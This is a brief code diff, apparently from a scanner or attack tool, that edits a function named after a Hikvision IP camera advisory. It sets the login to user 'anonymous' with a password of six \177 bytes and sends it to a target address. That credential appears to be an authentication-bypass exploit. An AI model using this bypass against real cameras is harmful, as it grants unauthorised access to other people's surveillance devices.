@@ -39,8 +39,7 @@ int BA::checkOutput(const string *buffer, const char *ip, const int port) {
 
 //http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities 2
 inline bool commenceHikvisionEx1(const char *ip, const int port, bool digestMode) {
-	//std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");
-	std::string lpString = string("anonymous") + ":" + string("123");
+	std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");
 
 	string buffer;
 	int res = Connector::nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
